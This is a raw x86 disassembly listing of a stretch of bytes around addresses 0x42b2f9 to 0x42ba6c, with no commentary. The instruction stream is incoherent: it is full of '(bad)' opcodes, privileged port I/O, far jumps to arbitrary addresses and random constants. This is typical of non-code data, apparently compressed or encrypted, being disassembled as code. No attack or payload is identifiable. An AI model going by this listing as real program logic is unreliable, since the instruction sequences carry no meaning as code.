  42b2f9:	scas   eax,DWORD PTR es:[edi]
  42b2fa:	stc    
  42b2fb:	(bad)  
  42b2fc:	scas   eax,DWORD PTR es:[edi]
  42b2fd:	dec    eax
  42b2fe:	neg    ebx
  42b300:	outs   dx,BYTE PTR ds:[esi]
  42b301:	or     eax,0x4740b068
  42b306:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b307:	mov    eax,0xa917a48c
  42b30c:	mov    ds:0xf83456e2,eax
  42b311:	and    dh,ah
  42b313:	cwde   
  42b314:	aam    0x6b
  42b316:	pop    ss
  42b317:	mov    dh,0x6d
  42b319:	cmp    bh,BYTE PTR [eax]
  42b31b:	mov    ah,0xf8
  42b31d:	js     0x42b347
  42b31f:	mov    ds:0xd6b95c3a,al
  42b324:	add    eax,0xdadb6dc0
  42b329:	mov    WORD PTR [esi+ecx*2-0x775985f7],?
  42b330:	or     ebp,ebp
  42b332:	(bad)  
  42b333:	aad    0x65
  42b335:	sub    BYTE PTR [ecx+0x12],bh
  42b338:	pusha  
  42b339:	mov    dh,0x80
  42b33b:	mov    dh,0xd6
  42b33d:	and    edx,DWORD PTR [edi]
  42b33f:	sar    DWORD PTR [ebp+0x6a],0x4a
  42b343:	mov    ebx,0xd87b744d
  42b348:	and    esp,DWORD PTR [eax-0x75]
  42b34b:	and    BYTE PTR [ebx],0xd6
  42b34e:	xchg   ecx,eax
  42b34f:	aas    
  42b350:	fidiv  DWORD PTR [esi+0x74a56e23]
  42b356:	xchg   ebp,eax
  42b357:	inc    dh
  42b359:	neg    dl
  42b35b:	dec    edi
  42b35c:	mov    BYTE PTR [eax],ah
  42b35e:	cmp    ah,BYTE PTR [edx-0x59495a55]
  42b364:	inc    esp
  42b365:	lods   al,BYTE PTR ds:[esi]
  42b366:	sbb    ah,BYTE PTR [esi-0x27c79180]
  42b36c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b36d:	cld    
  42b36e:	push   ebx
  42b36f:	scas   al,BYTE PTR es:[edi]
  42b370:	cmp    esi,DWORD PTR gs:0xb49add00
  42b377:	mov    bh,0xd1
  42b379:	cmc    
  42b37a:	xor    eax,esp
  42b37c:	inc    ebp
  42b37d:	or     eax,0x11ba826a
  42b382:	sbb    DWORD PTR [ebp+0x2eb2d95f],edx
  42b388:	call   0x55b1ced3
  42b38d:	popa   
  42b38e:	push   esp
  42b38f:	xchg   ebx,eax
  42b390:	pop    edi
  42b391:	ins    DWORD PTR es:[edi],dx
  42b392:	xor    al,0xa0
  42b394:	test   DWORD PTR [esi-0x12],ebx
  42b397:	xor    DWORD PTR [ecx-0x49492bfa],edx
  42b39d:	mov    cl,0x44
  42b39f:	jo     0x42b41a
  42b3a1:	cmp    al,0xd6
  42b3a3:	retf   
  42b3a4:	inc    ecx
  42b3a5:	jne    0x42b354
  42b3a7:	jne    0x42b35d
  42b3a9:	sbb    esp,esi
  42b3ab:	repnz mov ch,0xd0
  42b3ae:	ret    
  42b3af:	out    dx,eax
  42b3b0:	mov    ecx,0xb6b6d808
  42b3b5:	int3   
  42b3b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b3b7:	jbe    0x42b432
  42b3b9:	sbb    bl,BYTE PTR [ecx+eax*2-0x49]
  42b3bd:	lods   eax,DWORD PTR ds:[esi]
  42b3be:	inc    ecx
  42b3bf:	aad    0x2c
  42b3c1:	scas   eax,DWORD PTR es:[edi]
  42b3c2:	(bad)  
  42b3c6:	mov    BYTE PTR [ebx],cl
  42b3c8:	or     ecx,DWORD PTR ds:0xa9429c51
  42b3ce:	std    
  42b3cf:	mov    esi,0xd2d41d83
  42b3d4:	repnz adc eax,DWORD PTR [eax]
  42b3d7:	pop    esp
  42b3d8:	push   eax
  42b3d9:	mov    al,ds:0x8df8c374
  42b3de:	add    ch,BYTE PTR [esi]
  42b3e0:	mov    ah,0x5b
  42b3e2:	ins    DWORD PTR es:[edi],dx
  42b3e3:	ret    
  42b3e4:	mov    ecx,0xd385ace3
  42b3e9:	adc    ah,bl
  42b3eb:	mov    dh,0x9a
  42b3ed:	(bad)  
  42b3ee:	in     al,0x1
  42b3f0:	push   eax
  42b3f1:	jmp    0xbb582312
  42b3f6:	mov    BYTE PTR ds:0x6a9fbdb0,cl
  42b3fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b3fd:	sti    
  42b3fe:	xchg   esi,eax
  42b3ff:	dec    edx
  42b400:	adc    eax,0xbb91a94d
  42b405:	inc    esp
  42b406:	inc    esi
  42b407:	and    eax,0x2dd05c0
  42b40c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b40d:	xchg   edi,eax
  42b40e:	(bad)  
  42b40f:	(bad)  
  42b410:	push   ss
  42b411:	ss mov dh,0xc2
  42b414:	adc    ecx,DWORD PTR [esi-0x75ae7339]
  42b41a:	cli    
  42b41b:	mov    ch,0x27
  42b41d:	dec    ebx
  42b41e:	or     eax,0x7bee1710
  42b423:	leave  
  42b424:	mov    ebp,0xaa33f80d
  42b429:	fcmovnbe st,st(6)
  42b42b:	mov    dh,0xa6
  42b42d:	imul   ebp,DWORD PTR [ebx],0xffffffdd
  42b430:	bound  ecx,QWORD PTR [esi]
  42b432:	pop    edi
  42b433:	jmp    0xa91e1ed2
  42b438:	push   cs
  42b439:	inc    eax
  42b43a:	dec    edi
  42b43b:	sub    ebx,0x3705fbad
  42b441:	push   0x33502f9b
  42b446:	fisttp QWORD PTR [esi]
  42b448:	iret   
  42b449:	add    dl,BYTE PTR [ebx+ebx*2-0x29f1a8a5]
  42b450:	jge    0x42b4af
  42b452:	or     eax,0xd6850102
  42b457:	mov    dh,0x4
  42b459:	mov    edx,edi
  42b45b:	outs   dx,BYTE PTR ds:[esi]
  42b45c:	ss push ebp
  42b45e:	int    0xa1
  42b460:	pop    ebp
  42b461:	fcomp  st(2)
  42b463:	dec    ebp
  42b464:	xor    ebp,0x59eb41c2
  42b46a:	pop    esi
  42b46b:	ds push ebp
  42b46d:	sub    eax,0x6260b550
  42b472:	lods   al,BYTE PTR ds:[esi]
  42b473:	push   eax
  42b474:	cli    
  42b475:	mov    eax,ds:0x5d11d1b8
  42b47a:	jmp    0x69689f7b
  42b47f:	inc    esi
  42b480:	pop    ss
  42b481:	shr    DWORD PTR [ebp+0x7af93506],1
  42b487:	or     DWORD PTR [eax+0x29b451d2],esp
  42b48d:	call   0x59909cda
  42b492:	enter  0xedb6,0x56
  42b496:	fild   DWORD PTR [ebx-0x50]
  42b499:	sar    esi,1
  42b49b:	xchg   edi,eax
  42b49c:	adc    al,0xf
  42b49e:	outs   dx,BYTE PTR ds:[esi]
  42b49f:	cld    
  42b4a0:	adc    al,0xbd
  42b4a2:	dec    edx
  42b4a3:	shl    DWORD PTR [esi+0x38e8e6d5],0xcb
  42b4aa:	push   es
  42b4ab:	jmp    0x3b38:0xdb76c10d
  42b4b2:	sahf   
  42b4b3:	(bad)
  42b4b8:	rcl    dl,0xb6
  42b4bb:	shl    BYTE PTR [esi+0x236daa70],1
  42b4c1:	and    eax,0x11dd802b
  42b4c6:	pop    esp
  42b4c7:	sub    BYTE PTR [ecx],dl
  42b4c9:	in     eax,dx
  42b4ca:	mov    gs:0x89c75944,al
  42b4d0:	dec    eax
  42b4d1:	or     dl,BYTE PTR [ebx-0x4b]
  42b4d4:	sub    eax,0x2a624da9
  42b4d9:	repz xchg esi,eax
  42b4db:	jbe    0x42b4e2
  42b4dd:	fdiv   QWORD PTR [ebx+eiz*8+0x42c74844]
  42b4e4:	jno    0x42b502
  42b4e6:	mov    dh,0xad
  42b4e8:	add    DWORD PTR [esi],esi
  42b4ea:	pusha  
  42b4eb:	loop   0x42b4d8
  42b4ed:	add    ah,BYTE PTR [ecx-0x72942841]
  42b4f3:	mov    dh,0xdd
  42b4f5:	ss nop
  42b4f7:	or     al,0x65
  42b4f9:	enter  0x989c,0xc4
  42b4fd:	ds push ecx
  42b4ff:	test   eax,0x295ad575
  42b504:	jmp    0xdd4885ef
  42b509:	fild   DWORD PTR [edx+0x6b2f7689]
  42b50f:	or     eax,0xe37efaf7
  42b514:	adc    esp,DWORD PTR [ecx]
  42b516:	sbb    BYTE PTR [ebx],0xb
  42b519:	call   0x562c:0x2c156318
  42b520:	test   DWORD PTR [edx-0x7c102853],ecx
  42b526:	and    DWORD PTR [ebp-0x45],0x74dbb46d
  42b52d:	aam    0xf7
  42b52f:	dec    ebx
  42b530:	cmp    DWORD PTR [esi+0x36],0x59
  42b534:	mov    eax,ds:0x2ee629
  42b539:	outs   dx,BYTE PTR ds:[esi]
  42b53a:	pop    ebx
  42b53b:	sbb    eax,0x85a5e042
  42b540:	mov    ch,BYTE PTR [edx-0x5]
  42b543:	rol    DWORD PTR [ebp+0x313d25a6],1
  42b549:	adc    BYTE PTR [eax-0xb],cl
  42b54c:	into   
  42b54d:	mov    eax,0xa6b71a00
  42b552:	lahf   
  42b553:	push   ebx
  42b554:	sub    DWORD PTR [esi+0x5],ecx
  42b557:	js     0x42b519
  42b559:	mov    dh,0x6c
  42b55b:	xor    al,0xe4
  42b55d:	lahf   
  42b55e:	loopne 0x42b509
  42b560:	repnz repz fiadd DWORD PTR [ebp+0x720e128d]
  42b568:	fadd   QWORD PTR [esi+0x52]
  42b56b:	popa   
  42b56c:	xchg   BYTE PTR [eax+ebp*1+0x6c],bl
  42b570:	aaa    
  42b571:	dec    eax
  42b572:	icebp  
  42b573:	adc    ebp,DWORD PTR [esi-0x27]
  42b576:	test   eax,0xd6b5169d
  42b57b:	push   ebp
  42b57c:	jne    0x42b5e9
  42b57e:	fiadd  WORD PTR ds:0x698e8e01
  42b584:	shr    DWORD PTR [ebx],1
  42b586:	rcl    BYTE PTR [edx-0x1d],1
  42b589:	inc    ebp
  42b58a:	inc    edi
  42b58b:	sub    bl,BYTE PTR [ecx+ebx*1-0x59]
  42b58f:	and    dh,dl
  42b591:	(bad)  
  42b592:	dec    edx
  42b593:	ins    DWORD PTR es:[edi],dx
  42b594:	ins    DWORD PTR es:[edi],dx
  42b595:	ficomp DWORD PTR [ebx-0x77]
  42b598:	stos   BYTE PTR es:[edi],al
  42b599:	pop    ebp
  42b59a:	int    0xb2
  42b59c:	ins    DWORD PTR es:[edi],dx
  42b59d:	ins    BYTE PTR es:[edi],dx
  42b59e:	fild   DWORD PTR [esi+0x18c28b05]
  42b5a4:	push   esp
  42b5a5:	and    al,cl
  42b5a7:	xchg   ecx,eax
  42b5a8:	ins    DWORD PTR es:[edi],dx
  42b5a9:	inc    edi
  42b5aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b5ab:	loopne 0x42b5e5
  42b5ad:	add    DWORD PTR [ecx],ecx
  42b5af:	jo     0x42b538
  42b5b1:	test   al,0x38
  42b5b3:	or     dl,BYTE PTR [esi+0x4bd823a]
  42b5b9:	mov    eax,0xe0a3df5f
  42b5be:	ret    0x9956
  42b5c1:	fstp   QWORD PTR [ecx+ecx*2+0x32]
  42b5c5:	or     eax,esi
  42b5c7:	imul   esi,DWORD PTR [edi-0x3e034926],0xfffffff5
  42b5ce:	imul   ecx,DWORD PTR [esi+ebp*1-0x3d8211f6],0x6db76c01
  42b5d9:	inc    eax
  42b5da:	stos   BYTE PTR es:[edi],al
  42b5db:	aaa    
  42b5dc:	gs or  al,0xc5
  42b5df:	jecxz  0x42b576
  42b5e1:	sub    eax,ebx
  42b5e3:	outs   dx,BYTE PTR ds:[esi]
  42b5e4:	dec    ebp
  42b5e5:	dec    ebx
  42b5e6:	in     al,0x8f
  42b5e8:	sahf   
  42b5e9:	popf   
  42b5ea:	mov    dh,0x18
  42b5ec:	mov    bh,0xcd
  42b5ee:	inc    esp
  42b5ef:	mov    ch,0xb1
  42b5f1:	jo     0x42b62f
  42b5f3:	stos   DWORD PTR es:[edi],eax
  42b5f4:	pop    edx
  42b5f5:	mov    ah,0xe1
  42b5f7:	outs   dx,BYTE PTR ds:[esi]
  42b5f8:	pop    ebp
  42b5f9:	adc    BYTE PTR [ebx],cl
  42b5fb:	(bad)  [ecx-0x165bcea9]
  42b601:	pop    ebp
  42b602:	retf   
  42b603:	ret    0xd6c2
  42b606:	xor    eax,0xf24970ec
  42b60b:	and    dl,BYTE PTR [ebx]
  42b60d:	xor    esi,DWORD PTR [esi-0x7f92d2d3]
  42b613:	inc    ecx
  42b614:	dec    edx
  42b615:	jbe    0x42b646
  42b617:	test   DWORD PTR [edx-0x69],edi
  42b61a:	push   cs
  42b61b:	outs   dx,BYTE PTR ds:[esi]
  42b61c:	sbb    ecx,DWORD PTR [ebx-0x13]
  42b61f:	fimul  DWORD PTR [edx+0x7d]
  42b622:	xlat   BYTE PTR ds:[ebx]
  42b623:	mov    WORD PTR [edx-0x3acad69c],fs
  42b629:	xchg   edi,eax
  42b62a:	push   ss
  42b62b:	mov    edx,0xe875f302
  42b630:	and    al,0x8
  42b632:	push   edi
  42b633:	jo     0x42b698
  42b635:	add    DWORD PTR [eax-0x70b01db9],ecx
  42b63b:	dec    eax
  42b63c:	mov    bh,0xad
  42b63e:	shl    BYTE PTR [esi+0x1d],cl
  42b641:	mov    esp,0xcd53a365
  42b646:	adc    al,0x5c
  42b648:	cwde   
  42b649:	jmp    0xc1c4:0xb7a2368
  42b650:	ret    0x3a96
  42b653:	sbb    BYTE PTR [ebp+0x75],0xdb
  42b657:	mov    BYTE PTR [ecx],dl
  42b659:	jp     0x42b6bb
  42b65b:	call   0xa88b:0x6d04f8d9
  42b662:	test   eax,0xce90d94c
  42b667:	adc    al,0x5b
  42b669:	shr    BYTE PTR cs:[esi+0x11],1
  42b66d:	pop    esp
  42b66e:	sub    BYTE PTR [edi+0x12d5b38a],cl
  42b674:	bound  ebx,QWORD PTR [ebp+0x10]
  42b677:	fst    QWORD PTR [edx-0x2c]
  42b67a:	adc    cl,al
  42b67c:	xor    DWORD PTR [ecx],ecx
  42b67e:	push   esi
  42b67f:	lods   eax,DWORD PTR ds:[esi]
  42b680:	add    DWORD PTR [edx-0x1996be93],edi
  42b686:	popf   
  42b687:	mov    dl,bh
  42b689:	in     eax,0xb
  42b68b:	inc    esp
  42b68c:	push   ecx
  42b68d:	cli    
  42b68e:	rcr    DWORD PTR [ecx+0x7ee334d4],1
  42b694:	push   0xb6dada8d
  42b699:	out    0x33,al
  42b69b:	xchg   edx,eax
  42b69c:	mov    eax,ds:0x3eaa73e
  42b6a1:	ins    DWORD PTR es:[edi],dx
  42b6a2:	or     eax,0x16d8a218
  42b6a7:	rcr    BYTE PTR [edx+0x38],0xf7
  42b6ab:	bound  ebx,QWORD PTR [ebx+0x28]
  42b6ae:	push   ebp
  42b6af:	sub    al,0x70
  42b6b1:	pop    edi
  42b6b2:	push   0x615b88ec
  42b6b7:	jmp    0x42b67f
  42b6b9:	out    0x4d,eax
  42b6bb:	mov    esi,0x82556b8
  42b6c0:	inc    ebp
  42b6c1:	pop    esp
  42b6c2:	fdivr  DWORD PTR [edx+0x12b6c713]
  42b6c8:	xchg   edi,eax
  42b6c9:	dec    edx
  42b6ca:	sub    al,0x10
  42b6cc:	dec    ebx
  42b6cd:	mov    al,0xd0
  42b6cf:	loop   0x42b71d
  42b6d1:	inc    ebx
  42b6d2:	ret    
  42b6d3:	and    BYTE PTR [edi],dh
  42b6d5:	fcomp  DWORD PTR [eiz*4-0x3301c8b3]
  42b6dc:	lods   eax,DWORD PTR ds:[esi]
  42b6dd:	aas    
  42b6de:	sub    al,0x14
  42b6e0:	mov    al,0x51
  42b6e2:	mov    BYTE PTR [eax-0x75],bl
  42b6e5:	xlat   BYTE PTR ds:[ebx]
  42b6e6:	imul   esi,DWORD PTR [ecx-0x47291fae],0xffffffb0
  42b6ed:	fsubr  QWORD PTR [esi]
  42b6ef:	cmp    bh,BYTE PTR [ebx+0x3f]
  42b6f2:	or     al,0xb3
  42b6f4:	xlat   BYTE PTR ds:[ebx]
  42b6f5:	push   DWORD PTR [eax+0x69]
  42b6f8:	mov    eax,ds:0xd92a3c2b
  42b6fd:	push   ss
  42b6fe:	in     al,dx
  42b6ff:	loope  0x42b6be
  42b701:	mov    dh,0x26
  42b703:	push   0x8945a757
  42b708:	mov    ebp,0x708f8343
  42b70d:	imul   ebx,ebx,0xc7a74d8
  42b713:	cld    
  42b714:	sbb    bh,BYTE PTR [ebp+0x8a1c0fe]
  42b71a:	mov    eax,0xa60a00d4
  42b71f:	add    eax,0x636db863
  42b724:	pop    ebx
  42b725:	push   0xc934e08d
  42b72a:	(bad)  
  42b72b:	stos   DWORD PTR es:[edi],eax
  42b72c:	cdq    
  42b72d:	mov    ch,BYTE PTR [edi]
  42b72f:	mov    dh,0x4b
  42b731:	dec    ebp
  42b732:	lds    edi,FWORD PTR [edi-0x55eb56fc]
  42b738:	inc    edx
  42b739:	pop    ebx
  42b73a:	mov    ecx,0xeda17441
  42b73f:	cmp    BYTE PTR [eax+0x40ecaf88],0x90
  42b746:	mov    ?,WORD PTR [eax+0x5b]
  42b749:	fimul  WORD PTR [edx+0x15]
  42b74c:	adc    DWORD PTR [eax+0x38eb1f00],esi
  42b752:	cli    
  42b753:	lods   al,BYTE PTR ds:[esi]
  42b754:	mov    eax,ds:0x1d417609
  42b759:	leave  
  42b75a:	cmp    dh,BYTE PTR [edx]
  42b75c:	and    ch,BYTE PTR [edx+0x6d]
  42b75f:	adc    edx,esp
  42b761:	jbe    0x42b764
  42b763:	clc    
  42b764:	dec    ebp
  42b765:	ficomp WORD PTR [eax-0x48465462]
  42b76b:	sub    BYTE PTR es:[esi-0x71],ch
  42b76f:	dec    eax
  42b770:	pop    ss
  42b771:	mov    ebx,0x7ce89e25
  42b776:	sub    DWORD PTR [eax+0x7],esp
  42b779:	add    al,0x4
  42b77b:	mov    dh,0xad
  42b77d:	scas   eax,DWORD PTR es:[edi]
  42b77e:	loopne 0x42b7c2
  42b780:	stc    
  42b781:	mov    dh,0x9f
  42b783:	sbb    edx,DWORD PTR [esi-0x35]
  42b786:	add    BYTE PTR [edi],ch
  42b788:	ret    0x34ac
  42b78b:	das    
  42b78c:	pop    es
  42b78d:	shl    BYTE PTR [edx-0x5],0x7d
  42b791:	(bad)  
  42b792:	pop    edi
  42b793:	gs pop edi
  42b795:	cmc    
  42b796:	sbb    esi,DWORD PTR [ecx-0x9b93b4b]
  42b79c:	arpl   WORD PTR [ecx],cx
  42b79e:	cmp    eax,0xb853797c
  42b7a3:	rcl    DWORD PTR [edx-0x45],1
  42b7a6:	loope  0x42b7c8
  42b7a8:	inc    ebp
  42b7a9:	or     BYTE PTR [edi-0x7e],dh
  42b7ac:	mov    eax,0x342b3a94
  42b7b1:	les    ecx,FWORD PTR [esi-0x30cda277]
  42b7b7:	sbb    ah,0x75
  42b7ba:	and    BYTE PTR ds:0x798251a0,0x62
  42b7c1:	sbb    al,0xc1
  42b7c3:	lods   eax,DWORD PTR ds:[esi]
  42b7c4:	test   eax,0x4c50edf1
  42b7c9:	loop   0x42b7a7
  42b7cb:	inc    eax
  42b7cc:	les    ecx,FWORD PTR [ebp+0x7b74092e]
  42b7d2:	xchg   edi,eax
  42b7d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b7d4:	imul   esp,ecx,0x76b6d6e1
  42b7da:	mov    DWORD PTR [edi+0x67],esp
  42b7dd:	jbe    0x42b774
  42b7df:	aaa    
  42b7e0:	jns    0x42b7ff
  42b7e2:	test   DWORD PTR [ebp-0x42739c93],eax
  42b7e8:	mov    eax,ds:0xc1b5db3b
  42b7ed:	dec    ecx
  42b7ee:	sbb    esp,DWORD PTR ds:0xe04b608
  42b7f4:	shl    BYTE PTR [esi-0x7f],cl
  42b7f7:	push   0x2c
  42b7f9:	ins    BYTE PTR es:[edi],dx
  42b7fa:	push   eax
  42b7fb:	or     eax,DWORD PTR [ebx-0x63]
  42b7fe:	pop    esp
  42b7ff:	push   ebx
  42b800:	mov    BYTE PTR [ebp-0x26],ah
  42b803:	mov    BYTE PTR [eax],ch
  42b805:	dec    ebx
  42b806:	xor    DWORD PTR [esi-0xf],ebp
  42b809:	int3   
  42b80a:	fsubr  DWORD PTR [eax+0x6d]
  42b80d:	and    bl,0xae
  42b810:	fst    QWORD PTR [edi+0x70b0105d]
  42b816:	test   eax,0x4e2b465d
  42b81b:	ret    0x3a02
  42b81e:	scas   al,BYTE PTR es:[edi]
  42b81f:	xchg   ecx,eax
  42b820:	outs   dx,BYTE PTR ds:[esi]
  42b821:	or     ebx,DWORD PTR [ebx]
  42b823:	ins    DWORD PTR es:[edi],dx
  42b824:	pop    ss
  42b825:	(bad)  
  42b826:	push   esi
  42b827:	mov    ebp,es
  42b829:	inc    ebp
  42b82a:	mov    eax,0xb04b1a3a
  42b82f:	sub    eax,0x2e324d6c
  42b834:	sub    al,0x14
  42b836:	push   cs
  42b837:	cmp    BYTE PTR [eax-0x56],dl
  42b83a:	mov    dh,0x5d
  42b83c:	push   esp
  42b83d:	(bad)  
  42b83f:	sti    
  42b840:	mov    bl,0xb4
  42b842:	inc    ebp
  42b843:	adc    al,0x8a
  42b845:	sbb    cl,BYTE PTR [ebx+0x434250af]
  42b84b:	adc    BYTE PTR [eax*2+0x3afd0579],ch
  42b852:	mov    dh,0x85
  42b854:	jbe    0x42b84f
  42b856:	push   ebp
  42b857:	push   eax
  42b858:	add    BYTE PTR [edi+0x43cbef9a],bl
  42b85e:	mov    esp,0x4b4b97a4
  42b863:	lods   eax,DWORD PTR ds:[esi]
  42b864:	fdiv   DWORD PTR [eax+0x7a173c9c]
  42b86a:	xchg   edx,eax
  42b86b:	lock adc DWORD PTR [edi+0xa5f28d],esi
  42b872:	sbb    eax,0x2fce696e
  42b877:	repz das 
  42b879:	mov    ch,0xdb
  42b87b:	push   edx
  42b87c:	inc    edi
  42b87d:	dec    esi
  42b87e:	aaa    
  42b87f:	mov    bl,0xca
  42b881:	inc    ecx
  42b882:	outs   dx,DWORD PTR ds:[esi]
  42b883:	mov    esp,esi
  42b885:	ins    DWORD PTR es:[edi],dx
  42b886:	stos   DWORD PTR es:[edi],eax
  42b887:	add    edi,DWORD PTR [edx+0x76d35c1a]
  42b88d:	push   es
  42b88e:	and    eax,0xb54cc53b
  42b893:	adc    ch,BYTE PTR [ebp+0x5f4beb78]
  42b899:	fdivr  DWORD PTR [ebx-0x1bf76b93]
  42b89f:	iret   
  42b8a0:	jl     0x42b825
  42b8a2:	cmp    cl,dl
  42b8a4:	sti    
  42b8a5:	pusha  
  42b8a6:	add    DWORD PTR [esi+0x40],0xadcd1214
  42b8ad:	or     DWORD PTR [edx+0x29],esp
  42b8b0:	mov    ch,0xbe
  42b8b2:	adc    BYTE PTR [eax-0x393bc9f5],cl
  42b8b8:	(bad)  
  42b8b9:	aaa    
  42b8ba:	adc    edi,edi
  42b8bc:	std    
  42b8bd:	mov    ah,0x6a
  42b8bf:	mov    ah,0x11
  42b8c1:	cwde   
  42b8c2:	sub    DWORD PTR [eax+0x0],0xffffffda
  42b8c6:	repnz lods eax,DWORD PTR ds:[esi]
  42b8c8:	pop    edi
  42b8c9:	mov    dl,0x9f
  42b8cb:	pop    es
  42b8cc:	mov    bh,0x5
  42b8ce:	inc    ebx
  42b8cf:	add    al,0x94
  42b8d1:	out    dx,al
  42b8d2:	out    dx,eax
  42b8d3:	xchg   ebx,eax
  42b8d4:	mov    eax,DWORD PTR [ecx+0x3]
  42b8d7:	sbb    bl,0xc2
  42b8da:	sbb    BYTE PTR ds:0xca5374ed,ah
  42b8e0:	pop    eax
  42b8e1:	fdiv   DWORD PTR [esi+0x2aa4b6c2]
  42b8e7:	(bad)  
  42b8e8:	xchg   esp,eax
  42b8e9:	adc    al,ah
  42b8eb:	dec    eax
  42b8ec:	das    
  42b8ed:	popf   
  42b8ee:	ins    DWORD PTR es:[edi],dx
  42b8ef:	ins    DWORD PTR es:[edi],dx
  42b8f0:	pop    ds
  42b8f1:	fst    QWORD PTR [edi+ebx*8-0x49]
  42b8f5:	and    eax,0xc17753ca
  42b8fa:	mov    ecx,0xb6e82ec5
  42b8ff:	xor    eax,0x3a136b54
  42b904:	xchg   BYTE PTR [ecx+0xc],cl
  42b907:	sub    DWORD PTR [esi+0x1b],ebp
  42b90a:	dec    ebp
  42b90b:	adc    bl,bh
  42b90d:	ss hlt 
  42b90f:	push   cs
  42b910:	pop    esp
  42b911:	jmp    0xb8e2771
  42b916:	or     DWORD PTR [eax],0xc84a2c2b
  42b91c:	jb     0x42b8c5
  42b91e:	mov    BYTE PTR [eax-0x45],ah
  42b921:	xchg   ebp,eax
  42b922:	inc    edi
  42b923:	sbb    dl,BYTE PTR [esp+ebp*8+0x55b13f5f]
  42b92a:	sub    al,0xc3
  42b92d:	mov    ecx,0xdbd4c779
  42b932:	mov    dh,0x85
  42b934:	(bad)  
  42b935:	outs   dx,DWORD PTR ds:[esi]
  42b936:	jns    0x42b946
  42b938:	or     al,BYTE PTR [ebp+0x4b689f5c]
  42b93e:	jge    0x42b996
  42b940:	inc    ebx
  42b941:	shl    BYTE PTR [esi-0x15],1
  42b944:	mov    WORD PTR ds:[ecx-0x18],es
  42b948:	cli    
  42b949:	cs mov al,0x6d
  42b94c:	ins    DWORD PTR es:[edi],dx
  42b94d:	in     eax,dx
  42b94e:	sub    eax,0xb82fcb92
  42b953:	fs cmp eax,0xf6ed44c8
  42b959:	ins    DWORD PTR es:[edi],dx
  42b95a:	inc    ebp
  42b95b:	adc    edx,ebx
  42b95d:	loopne 0x42b8e7
  42b95f:	ds inc ebx
  42b961:	dec    esi
  42b962:	out    dx,eax
  42b963:	fist   DWORD PTR [eax+0x5b]
  42b966:	adc    DWORD PTR [esi+0x2a],edx
  42b969:	retf   0xd43d
  42b96c:	jge    0x42b91e
  42b96e:	cld    
  42b96f:	pop    edi
  42b970:	pusha  
  42b971:	ds faddp st(7),st
  42b974:	add    BYTE PTR [ecx],bh
  42b976:	jl     0x42b978
  42b978:	sbb    DWORD PTR [esi+0x744b4d00],esi
  42b97e:	fstp   st(2)
  42b980:	ins    DWORD PTR es:[edi],dx
  42b981:	test   eax,0x293326bb
  42b986:	mov    ecx,0x54da5926
  42b98b:	push   ebp
  42b98c:	or     ebx,ebx
  42b98e:	(bad)  
  42b98f:	ds sti 
  42b991:	mov    WORD PTR ds:0x2f0f5038,gs
  42b997:	(bad)
  42b99a:	or     ebp,DWORD PTR [ebp*2+0x98d686c]
  42b9a1:	test   BYTE PTR [edx],dh
  42b9a3:	push   cs
  42b9a4:	add    ebx,DWORD PTR [ebx]
  42b9a6:	shr    DWORD PTR [esi+0x6c],1
  42b9a9:	or     ecx,DWORD PTR [edx]
  42b9ab:	icebp  
  42b9ac:	adc    al,0x20
  42b9ae:	arpl   WORD PTR [eax+0x6adc7113],bx
  42b9b4:	sbb    eax,0x4b7552d
  42b9b9:	xor    eax,0xa770f7a1
  42b9be:	mov    ch,0xd0
  42b9c0:	jbe    0x42b9c3
  42b9c2:	call   0xb54c:0x50838007
  42b9c9:	mov    DWORD PTR [edx-0x45],ebp
  42b9cc:	lods   eax,DWORD PTR ds:[esi]
  42b9cd:	lods   eax,DWORD PTR ds:[esi]
  42b9ce:	dec    ecx
  42b9cf:	mov    eax,ds:0x4a9675c3
  42b9d4:	or     bh,BYTE PTR [edi+0x7ab855d8]
  42b9da:	mov    ch,0x15
  42b9dc:	not    DWORD PTR [ecx-0x24]
  42b9df:	fsubr  DWORD PTR [esi]
  42b9e1:	(bad)  
  42b9e3:	mov    DWORD PTR ds:0x522d06,esp
  42b9e9:	out    dx,al
  42b9ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b9eb:	sti    
  42b9ec:	(bad)  
  42b9ed:	pushf  
  42b9ee:	outs   dx,BYTE PTR ds:[esi]
  42b9ef:	dec    edi
  42b9f0:	fdivr  QWORD PTR [esi+0x21e646bd]
  42b9f6:	adc    al,BYTE PTR [edi]
  42b9f8:	xor    DWORD PTR [eax],edi
  42b9fa:	sbb    eax,0x9ad8807f
  42b9ff:	cmp    bh,0xa2
  42ba02:	adc    al,0x58
  42ba04:	pop    ebx
  42ba05:	mov    esi,0xb305d4b1
  42ba0a:	mov    bl,0xe1
  42ba0c:	cmp    DWORD PTR [edx],ebx
  42ba0e:	add    BYTE PTR [edi+0x53],ch
  42ba11:	pop    edi
  42ba12:	fimul  DWORD PTR [ebp+0x64cd76d2]
  42ba18:	(bad)
  42ba1c:	jbe    0x42ba2d
  42ba1e:	mov    ecx,0x8256edaa
  42ba23:	cmp    esp,ebp
  42ba25:	jb     0x42b9a8
  42ba27:	mov    WORD PTR [eax],es
  42ba29:	fcmovnu st,st(0)
  42ba2b:	fidivr DWORD PTR [edx]
  42ba2d:	push   0xffffffb1
  42ba2f:	das    
  42ba30:	sbb    DWORD PTR [esi-0x7363e7b1],esp
  42ba36:	xor    al,0xdf
  42ba38:	bound  esp,QWORD PTR [ebx-0x78]
  42ba3b:	sbb    edi,0xe55a7b
  42ba41:	retf   0x3fb7
  42ba44:	outs   dx,BYTE PTR ds:[esi]
  42ba45:	dec    ebp
  42ba46:	adc    DWORD PTR [ebx+0x3c5bcebe],esi
  42ba4c:	ins    BYTE PTR es:[edi],dx
  42ba4d:	iret   
  42ba4e:	add    DWORD PTR [ecx+0x63],ebp
  42ba51:	sub    ebp,DWORD PTR [ebp+eax*1+0x47]
  42ba55:	shl    DWORD PTR [ebx+0x4142e781],0xdb
  42ba5c:	(bad)  
  42ba5d:	inc    esp
  42ba5e:	jne    0x42bac9
  42ba60:	cmovge ecx,DWORD PTR [bx+di-0x6179]
  42ba66:	out    0xaa,al
  42ba68:	lea    ebx,[ebx]
  42ba6a:	or     eax,DWORD PTR [ecx]
  42ba6c:	cmp    al,0xb1
